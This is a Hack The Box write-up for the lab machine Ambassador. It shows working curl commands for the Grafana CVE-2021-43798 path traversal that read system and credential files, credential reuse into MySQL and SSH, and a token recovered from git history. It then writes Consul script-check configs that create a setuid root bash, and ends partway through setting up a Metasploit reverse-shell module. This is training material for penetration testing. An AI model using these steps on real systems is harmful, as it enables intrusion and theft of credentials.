# HTB: Ambassador
Source: https://0xdf.gitlab.io/2023/01/28/htb-ambassador.html

# HTB: Ambassador

htb-ambassador hackthebox ctf nmap feroxbuster grafana searchsploit cve-2021-43798 file-read directory-traversal consul msfconsole tunnel Jan 28, 2023

HTB: Ambassador

HTB: Ambassador

Ambassador starts off with a Grafana instance. I’ll exploit a directory traversal / file read vulnerability to read the config and get the password for the admin. From the Grafana admin panel, I’ll get creds to the MySQL instance. Logging into that leaks credentials for a developer and I can get a shell with SSH. This developer has access to a git repo that leaks a token used for Consul in an old commit. I’ll use that to interact with Consul and get execution as root. I’ll show doing it both manually as well as using Metasploit.

## Box Info

## Recon

### nmap

nmap finds four open TCP ports, SSH (22), two HTTP (80, 3000), and MySQL (3306):

```
nmap
```

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.183
Starting Nmap 7.80 ( https://nmap.org ) at 2022-09-15 17:58 UTC
Nmap scan report for 10.10.11.183
Host is up (0.086s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 7.74 seconds
oxdf@hacky$ nmap -p 22,80,3000,3306 -sCV 10.10.11.183
Starting Nmap 7.80 ( https://nmap.org ) at 2022-09-15 17:58 UTC
Nmap scan report for 10.10.11.183
Host is up (0.086s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Hugo 0.94.2
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Ambassador Development Server
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Thu, 15 Sep 2022 18:02:33 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Thu, 15 Sep 2022 18:02:01 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Thu, 15 Sep 2022 18:02:06 GMT
|_    Content-Length: 0
3306/tcp open  nagios-nsca Nagios NSCA
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 9
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, InteractiveClient, SwitchToSSLAfterHandshake, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, LongColumnFlag, SupportsCompression, ConnectWithDatabase, Speaks41ProtocolNew, FoundRows, LongPassword, DontAllowDatabaseTableColumn, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: @*^
| PRh\x02^\x0B\x1A]H!Yx\x1Fi+\x0E
|_  Auth Plugin Name: caching_sha2_password
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.80%I=7%D=9/15%Time=632367DF%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Contro
SF:l:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nExpir
SF:es:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cookie:\
SF:x20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Conten
SF:t-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protect
SF:ion:\x201;\x20mode=block\r\nDate:\x20Thu,\x2015\x20Sep\x202022\x2018:02
SF::01\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found<
SF:/a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\nCac
SF:he-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPra
SF:gma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20HttpO
SF:nly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-O
SF:ptions:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Th
SF:u,\x2015\x20Sep\x202022\x2018:02:06\x20GMT\r\nContent-Length:\x200\r\n\
SF:r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSess
SF:ionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(FourOhFourRequest,1A1,"HTTP/1\.0\x20302\x20Found\
SF:r\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset
SF:=utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\
SF:r\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.txt
SF:%252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x201;
SF:\x20mode=block\r\nDate:\x20Thu,\x2015\x20Sep\x202022\x2018:02:33\x20GMT
SF:\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</a>\.\n\n"
SF:);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.80 seconds

```

Based on the OpenSSH and Apache versions, the host is likely running Ubuntu 20.04 focal.

Not much I can do with SSH or MySQL without creds, so I’ll revisit later if I find some.

### Website - TCP 80

#### Site

The site is a blog with one post from Ambassador Inc:

Clicking “read more” gives the post:

#### Tech Stack

The HTTP headers show Apache but not much else:

```
HTTP/1.1 200 OK
Date: Thu, 15 Sep 2022 18:04:16 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Fri, 02 Sep 2022 01:37:04 GMT
ETag: "1234-5e7a7c4652f79-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 4660
Connection: close
Content-Type: text/html

```

There is a meta tag in the HTML headers that shows Hugo:

```
meta
```

```
<meta name="generator" content="Hugo 0.94.2" />

```

Hugo is a static site generator, and a good hint that there’s probably not a lot of interactive stuff on this page.

The root page also loads as index.html , which makes sense given it’s coming from a static site generator.

```
index.html
```

#### Directory Brute Force

I’ll run feroxbuster against the site:

```
feroxbuster
```

```
oxdf@hacky$ feroxbuster -u http://10.10.11.183

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.183
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      155l      305w     3654c http://10.10.11.183/
301      GET        9l       28w      313c http://10.10.11.183/images => http://10.10.11.183/images/
301      GET        9l       28w      311c http://10.10.11.183/tags => http://10.10.11.183/tags/
301      GET        9l       28w      317c http://10.10.11.183/categories => http://10.10.11.183/categories/
301      GET        9l       28w      312c http://10.10.11.183/posts => http://10.10.11.183/posts/
403      GET        9l       28w      277c http://10.10.11.183/server-status
[####################] - 52s   180000/180000  0s      found:6       errors:59752  
[####################] - 49s    30000/30000   602/s   http://10.10.11.183 
[####################] - 49s    30000/30000   604/s   http://10.10.11.183/ 
[####################] - 0s     30000/30000   0/s     http://10.10.11.183/images => Directory listing (add -e to scan)
[####################] - 49s    30000/30000   604/s   http://10.10.11.183/tags 
[####################] - 49s    30000/30000   607/s   http://10.10.11.183/categories 
[####################] - 49s    30000/30000   605/s   http://10.10.11.183/posts 

```

Nothing interesting.

### Grafana - TCP 3000

This server has an instance of Grafana :

At the bottom of the page, it shows version v8.2.0 (d7f71e9eae) .

```
v8.2.0 (d7f71e9eae)
```

## Shell as developer

### File Read

#### Identify Exploit

searchsploit shows two vulnerabilities associated with Grafana:

```
searchsploit
```

```
oxdf@hacky$ searchsploit grafana
----------------------------------------------------- ---------------------------------
 Exploit Title                                       |  Path
----------------------------------------------------- ---------------------------------
Grafana 7.0.1 - Denial of Service (PoC)              | linux/dos/48638.sh
Grafana 8.3.0 - Directory Traversal and Arbitrary Fi | multiple/webapps/50581.py
----------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

The one in 8.3.0 is labeled directory traversal and arbitrary file read. That version is one minor version up from what’s running on Ambassador, which is close enough that I should try it.

A bit more research shows that this is CVE-2021-43798 .

#### Exploit Analysis

I’ll grab a copy of the exploit script to take a look with searchsploit -m multiple/webapps/50581.py .

```
searchsploit -m multiple/webapps/50581.py
```

main just takes a host and then passed that to exploit :

```
main
```

```
exploit
```

```
def main():
    parser = argparse.ArgumentParser(description="Grafana V8.0.0-beta1 - 8.3.0 - Directory Traversal and Arbitrary File Read")
    parser.add_argument('-H',dest='host',required=True, help="Target host")
    args = parser.parse_args()

    try:
        exploit(args)
    except KeyboardInterrupt:
        return

```

exploit drops into a while True loop, reading a file, and then fetching it with a random choice from a long list of plugins:

```
exploit
```

```
while True
```

```
def exploit(args):
    s = requests.Session()
    headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.' }

    while True:
        file_to_read = input('Read file > ')

        try:
            url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read
            req = requests.Request(method='GET', url=url, headers=headers)
            prep = req.prepare()
            prep.url = url
            r = s.send(prep, verify=False, timeout=3)

            if 'Plugin file not found' in r.text:
                print('[-] File not found\n')
            else:
                if r.status_code == 200:
                    print(r.text)
                else:
                    print('[-] Something went wrong.')
                    return
        except requests.exceptions.ConnectTimeout:
            print('[-] Request timed out. Please check your host settings.\n')
            return
        except Exception:
            pass

```

#### POC

Rather than use the script, I’ll grab a plugin at random from the list and try to access the URL on Ambassador with curl the same way it did in the script. I’ll use --path-as-is to prevent curl from fixing things like ../ . It fetches /etc/passwd successfully, showing file read:

```
curl
```

```
--path-as-is
```

```
curl
```

```
../
```

```
/etc/passwd
```

```
oxdf@hacky$ curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...[snip]...
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
grafana:x:113:118::/usr/share/grafana:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
consul:x:997:997::/home/consul:/bin/false

```

### Grafana Access

#### grafana.ini

I can’t seem to read anything interesting in /home/developer , which suggests the webserver is running as another user (likely www-data).

```
/home/developer
```

There’s not much of interested to pull from the Hugo site, and I can read /var/www/html/index.html as the main page.

```
/var/www/html/index.html
```

Grafana stores a config in /etc/grafana/grafana.ini , according to the docs . I’m able to read it:

```
/etc/grafana/grafana.ini
```

```
oxdf@hacky$ curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../etc/grafana/grafana.ini
##################### Grafana Configuration Example #####################
#
# Everything has defaults so you only need to uncomment things you want to
# change

# possible values : production, development
;app_mode = production

# instance name, defaults to HOSTNAME environment variable value or hostname if HOSTNAME var is empty
;instance_name = ${HOSTNAME}
...[snip]...

```

In this config, # is used to write comments, where ; is used to comment out configurations, telling Grafana to use the default for that setting. The config file is quite long, but some bits jump out. The “Paths” section gives some paths on the host:

```
#
```

```
;
```

```
#################################### Paths ####################################
[paths]
# Path to where grafana can store temp files, sessions, and the sqlite3 db (if that is used)
;data = /var/lib/grafana

# Temporary files in `data` directory older than given duration will be removed
;temp_data_lifetime = 24h

# Directory where grafana can store logs
;logs = /var/log/grafana

# Directory where grafana will automatically scan and look for plugins
;plugins = /var/lib/grafana/plugins

# folder that contains provisioning config files that grafana will apply on startup and while running.
;provisioning = conf/provisioning   

```

At first I thought the DB section was weird, as it specifies the type of sqlite, but then gives a port and username:

```
#################################### Database ####################################
[database]
# You can configure the database connection by specifying type, host, name, user and password
# as separate properties or as on string using the url properties.

# Either "mysql", "postgres" or "sqlite3", it's your choice
;type = sqlite3
;host = 127.0.0.1:3306
;name = grafana
;user = root
# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
;password = 

```

It turns out, this is just the default config . I can try logging into MySQL with root and no password, but it doesn’t work:

```
oxdf@hacky$ mysql -u root -p -h 10.10.11.183
Enter password: 
ERROR 1045 (28000): Access denied for user 'root'@'10.10.14.6' (using password: NO)

```

The “Security” section has a bunch of stuff that’s commented out with ; , but the admin_password is not:

```
;
```

```
admin_password
```

```
#################################### Security ####################################
[security]
# disable creation of admin user on first start of grafana
;disable_initial_admin_creation = false             

# default admin user, created on startup
;admin_user = admin             

# default admin password, can be changed before first start of grafana,  or in profile settings
admin_password = messageInABottle685427
                                                    
# used for signing                               
;secret_key = SW2YcwTIb9zpOOhoPsMm

```

Another way to look at this is to use grep to remove anything that starts with # (comment), ; (comment), or [ (start of section).

```
grep
```

```
#
```

```
;
```

```
[
```

```
oxdf@hacky$ curl --path-as-is -s http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini | grep -v "^[#;\[]" | grep .
admin_password = messageInABottle685427

```

What’s left is just the password, meaning it’s the only non-default line in the config.

#### Log In

With that default admin password, I can log into Grafana as the admin user:

Click for full size image

### Database Access

#### Enumerate Grafana

Looking around in the Settings, there is a data source listed:

Click for full size image

Clicking on it, it’s named mysql.yaml , and defines a MySQL connection:

```
mysql.yaml
```

Click for full size image

It says this is added by a config file and can’t be modified in the UI.

#### Get mysql.yaml

The config file for this data source will likely have the creds for MySQL in it. The Grafana docs show that these configs live in /etc/grafana/provisioning/datasources .

```
/etc/grafana/provisioning/datasources
```

I’ll get the file with the file read vuln:

```
oxdf@hacky$ curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../etc/grafana/provisioning/datasources/mysql.yaml
apiVersion: 1

datasources:
 - name: mysql.yaml 
   type: mysql
   host: localhost
   database: grafana
   user: grafana
   password: dontStandSoCloseToMe63221!
   editable: false

```

#### Connect to MySQL

I’ll try these creds to connect to the DB, and they work:

```
oxdf@hacky$ mysql -h 10.10.11.183 -u grafana -p'dontStandSoCloseToMe63221!'
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>

```

### SSH

#### Enumerate Databases

MySQL is running two non-standard databases, grafana and whackywidget :

```
grafana
```

```
whackywidget
```

```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0.10 sec)

```

Looking in whacky widget, there’s only one table:

```
mysql> use whackywidget;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.08 sec)

```

It has one user, with a password field that looks like base64:

```
mysql> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0.09 sec)

```

#### Connect

I would expect to see “password” decode to some encrypted binary data, but it comes out as plain text:

```
oxdf@hacky$ echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d
anEnglishManInNewYork027468

```

That works to SSH as developer:

```
oxdf@hacky$ sshpass -p 'anEnglishManInNewYork027468' ssh developer@10.10.11.183
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)
...[snip]...
developer@ambassador:~$ 

```

And grab the user flag:

```
developer@ambassador:~$ cat user.txt
16a62cde************************

```

## Shell as root

### Enumeration

#### /opt

The /opt folder has two important folders to get to the next step:

```
/opt
```

```
developer@ambassador:/opt$ ls
consul  my-app

```

The consul folder is Consul :

```
consul
```

a distributed, highly available, and data center aware solution to connect and configure applications across dynamic, distributed infrastructure.

The my-app folder has two folders, and references “whackywidget”, which I’ll recall from the DB where I found developer creds.

```
my-app
```

```
developer@ambassador:/opt/my-app$ ls -la
total 24
drwxrwxr-x 5 root root 4096 Mar 13  2022 .
drwxr-xr-x 4 root root 4096 Sep  1 22:13 ..
drwxrwxr-x 4 root root 4096 Mar 13  2022 env
drwxrwxr-x 8 root root 4096 Mar 14  2022 .git
-rw-rw-r-- 1 root root 1838 Mar 13  2022 .gitignore
drwxrwxr-x 3 root root 4096 Mar 13  2022 whackywidget

```

env is a Python virtual environment. Not too much interesting there. This folder has a .git directory, so it’s a GIT repository.

```
env
```

```
.git
```

The whackywidget folder has a shell script, manage.py , and another folder that has Python files in it:

```
whackywidget
```

```
manage.py
```

```
developer@ambassador:/opt/my-app/whackywidget$ ls
manage.py  put-config-in-consul.sh  whackywidget
developer@ambassador:/opt/my-app/whackywidget$ ls whackywidget/
asgi.py  __init__.py  settings.py  urls.py  wsgi.py

```

manage.py and those other scripts are from a default Django install (a Python web framework). There’s not much to find in there.

```
manage.py
```

#### put-config-in-console.sh

The shell script is only one line, but it’s got a lot of clues about where to go next:

```
# We use Consul for application config in production, this script will help set the correct values for the app
# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running

consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD

```

It’s using the consul command line application to set a key/value pair with Consul. It also has comments about needing to export the MYSQL_PASSWORD and CONSUL_HTTP_TOKEN environment variables before running.

```
consul
```

```
MYSQL_PASSWORD
```

```
CONSUL_HTTP_TOKEN
```

The MYSQL_PASSWORD variable is what’s stored in the KV store. According to the Consul command line docs , the CONSUL_HTTP_TOKEN value is what’s used to validate access.

```
MYSQL_PASSWORD
```

```
CONSUL_HTTP_TOKEN
```

### Access to Consul

#### Access Denied

I’ll try to use consul without having a token, but it fails:

```
consul
```

```
developer@ambassador:/opt/my-app/whackywidget$ consul kv get whackywidget/db/mysql_pw
Error querying Consul agent: Unexpected response code: 403 (Permission denied)

```

In this case, I’m trying to read the value that gets set in the script. I’ll need to find that token.

#### Get Token

The first place I’ll look is in the developer’s home directory, but grep -r CONSUL_HTTP_TOKEN . doesn’t find anything.

```
grep -r CONSUL_HTTP_TOKEN .
```

Back in the app’s directory, I’ll look at the GIT log:

```
developer@ambassador:/opt/my-app/whackywidget$ git log --oneline
33a53ef (HEAD -> main) tidy config script
c982db8 config script
8dce657 created project with django CLI
4b8597b .gitignore

```

The most recent commit “tid(ied) the config script”.

Looking back at the previous commit, there’s a version of the script that has a token hard coded:

```
developer@ambassador:/opt/my-app/whackywidget$ git show c982db8:./put-config-in-consul.sh 
# We use Consul for application config in production, this script will help set the correct values for the app
# Export MYSQL_PASSWORD before running

consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD

```

#### Access POC

To test access, I’ll try the same command as above but with a token:

```
developer@ambassador:/opt/my-app/whackywidget$ CONSUL_HTTP_TOKEN='bb03b43b-1d81-d62b-24b5-39540ee469b5' consul kv get whackywidget/db/mysql_pw 

```

It returns an empty line, which isn’t impressive, but isn’t the not authorized error I got before.

I can write and read from the KV store:

```
developer@ambassador:/opt/my-app/whackywidget$ CONSUL_HTTP_TOKEN='bb03b43b-1d81-d62b-24b5-39540ee469b5' consul kv put whackywidget/db/mysql_pw 0xdf
Success! Data written to: whackywidget/db/mysql_pw
developer@ambassador:/opt/my-app/whackywidget$ CONSUL_HTTP_TOKEN='bb03b43b-1d81-d62b-24b5-39540ee469b5' consul kv get whackywidget/db/mysql_pw 
0xdf
developer@ambassador:/opt/my-app/whackywidget$ CONSUL_HTTP_TOKEN='bb03b43b-1d81-d62b-24b5-39540ee469b5' consul kv delete whackywidget/db/mysql_pw
Success! Deleted key: whackywidget/db/mysql_pw

```

### Execution via Consul

#### exec - Fail

It’s tempting to note that consul has an exec subcommand . Unfortunately, when I try to run it, it returns that 0 nodes completed or acknowledged:

```
consul
```

```
exec
```

```
developer@ambassador:/etc/consul.d$ CONSUL_HTTP_TOKEN='bb03b43b-1d81-d62b-24b5-39540ee469b5' consul exec id
0 / 0 node(s) completed / acknowledged

```

It doesn’t seem like there are any nodes online to execute one.

#### Consul Configuration

I’ll find the consul configuration in /etc/consul.d :

```
consul
```

```
/etc/consul.d
```

```
developer@ambassador:/etc/consul.d$ ls -l
total 16
drwx-wx--- 2 root   developer 4096 Sep 14 11:00 config.d
-rw-r--r-- 1 consul consul       0 Feb 28  2022 consul.env
-rw-r--r-- 1 consul consul    5303 Mar 14  2022 consul.hcl
-rw-r--r-- 1 consul consul     160 Mar 15  2022 README

```

Two of the files are empty. The README has a note about the configuration, and a link to more documentation :

```
developer@ambassador:/etc/consul.d$ cat README 
Configuration in Consul is read from the command line first and then from config files in lexical order.
https://www.consul.io/docs/agent/options#configuration

```

Looking at the command line for the running consul process shows that it’s running with both -config-dir and -config-file :

```
consul
```

```
-config-dir
```

```
-config-file
```

```
developer@ambassador:/etc/consul.d$ ps auxww | grep consul
root        1013  0.5  3.3 781092 66536 ?        Ssl  17:14   0:00 /usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hcl

```

On removing comments from the consol.hcl file, what remains is:

```
consol.hcl
```

```
developer@ambassador:/etc/consul.d$ cat consul.hcl | grep -v "^#" | grep .
data_dir = "/opt/consul"
server = true
bind_addr = "127.0.0.1"
bootstrap_expect=1
acl {
  enabled        = true
  default_policy = "deny"
  down_policy    = "extend-cache"
}
enable_script_checks = true

```

config.d is permissioned such that developer can write to it, but not read what’s in it. Presumably config files in that directory should be processed.

```
config.d
```

#### Script Checks

Looking at the enable_script_checks option can lead to this blog post about how Consul can be exploited by script checks. This page talks about how to create checks and includes examples.

```
enable_script_checks
```

The “service definition file” goes into the “agent’s configuration directory”, which I believe is /etc/consul.d/config.d .

```
/etc/consul.d/config.d
```

I’ll grab the example for a script check from the documents page above, and modify it a bit

```
check = {
  id = "0xdf"
  name = "0xdf owned this"
  args = ["/usr/bin/touch", "/tmp/0xdf-test"]
  interval = "10s"
  timeout = "1s"
}

```

This script check will now touch /tmp/0xdf-test as root. I’ll use vim to write that as config.d/0xdf.hcl .

```
/tmp/0xdf-test
```

```
vim
```

```
config.d/0xdf.hcl
```

I’ll reload consul to refresh the configuration:

```
consul
```

```
developer@ambassador:/etc/consul.d$ CONSUL_HTTP_TOKEN='bb03b43b-1d81-d62b-24b5-39540ee469b5' consul reload
Configuration reload triggered

```

The results of the scripts are available using journalctl , which requires root to access. Still, after a few seconds, I’ll see /tmp/0xdf-test exists:

```
journalctl
```

```
/tmp/0xdf-test
```

```
developer@ambassador:/etc/consul.d$ ls -l /tmp/0xdf-test
-rw-r--r-- 1 root root 0 Sep 14 17:25 /tmp/0xdf-test

```

#### Shell

To get a shell, I’ll update the check script file to include three checks:

```
checks = [
  {
    id = "0xdf-1"
    name = "copy bash"
    args = ["cp", "/bin/bash", "/tmp/0xdf"]
    interval = "60s"
  },
  {
    id = "0xdf-2"
    name = "make it root"
    args = ["/usr/bin/chown", "root:root", "/tmp/0xdf"]
    interval = "60s"
  },
  {
    id = "0xdf-3"
    name = "suid bash"
    args = ["/usr/bin/chmod", "4777", "/tmp/0xdf"]
    interval = "60s"
  }
]

```

This will copy bash to /tmp/0xdf , make sure it’s owned by root, and then make it SetUID. After reloading consul, the script runs, and it works:

```
bash
```

```
/tmp/0xdf
```

```
developer@ambassador:~$ ls -l /tmp/0xdf
-rwsrwxrwx 1 root root 1183448 Sep 14 17:33 /tmp/0xdf

```

Running this (with -p to not drop privs) returns a root shell:

```
-p
```

```
developer@ambassador:~$ /tmp/0xdf -p
0xdf-5.0#

```

And I can get the root flag:

```
0xdf-5.0# cat root.txt
739f3788************************

```

### MSF Alternative

There is a metasploit exploit for this same version of Consul. I’ll run msfconsole , and then use it:

```
msfconsole
```

```
use
```

```
msf6 > use multi/misc/consul_service_exec
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/misc/consul_service_exec) > 

```

The default RPORT is 8500 (also listed in the docs ), which is the Consul API, and is listening on Ambassador:

```
RPORT
```

```
developer@ambassador:~$ netstat -tnlp                 
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -                   
...[snip]...

```

I’ll use my SSH session to create a tunnel listening on 8500 on my host forwarding through the SSH session to 8500 on Ambassador ( -L 8500:localhost:8500 ). After configuring the exploit, it looks like this:

```
-L 8500:localhost:8500
```

```
msf6 exploit(multi/misc/consul_service_exec) > options

Module options (exploit/multi/misc/consul_service_exec):

   Name       Current Setting                       Required  Description
   ----       ---------------                       --------  -----------
   ACL_TOKEN  bb03b43b-1d81-d62b-24b5-39540ee469b5  no        Consul Agent ACL token
              
   Proxies                                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     127.0.0.1                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      8500                                  yes       The target port (TCP)
   SRVHOST    0.0.0.0                               yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080                                  yes       The local port to listen on.
   SSL        false                                 no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                                     yes       The base path
   URIPATH                                          no        The URI to use for this exploit (default is random)
   VHOST                                            no        HTTP server virtual host

Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
